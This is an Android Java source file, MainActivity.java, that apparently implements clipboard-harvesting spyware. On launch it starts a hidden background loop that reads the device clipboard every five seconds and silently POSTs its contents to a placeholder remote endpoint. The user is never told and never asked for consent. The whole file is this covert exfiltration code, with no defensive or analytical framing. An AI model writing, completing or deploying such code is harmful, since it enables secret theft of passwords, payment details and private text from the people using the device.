// Android App (MainActivity.java)
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    private ClipboardManager clipboardManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        // Start capturing clipboard data
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        String clipboardData = clipboardManager.getText().toString();
                        if (!clipboardData.isEmpty()) {
                            sendToServer(clipboardData);
                        }
                        Thread.sleep(5000); // Check every 5 seconds
                    } catch (Exception e) {
                        Log.e("ClipboardCapture", "Error capturing clipboard data", e);
                    }
                }
            }
        }).start();
    }

    private void sendToServer(String data) {
        try {
            URL url = new URL("http://your-server-endpoint.com/upload");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            Log.d("ClipboardCapture", "Server response: " + response.toString());
        } catch (Exception e) {
            Log.e("ClipboardCapture", "Error sending data to server", e);
        }
    }
}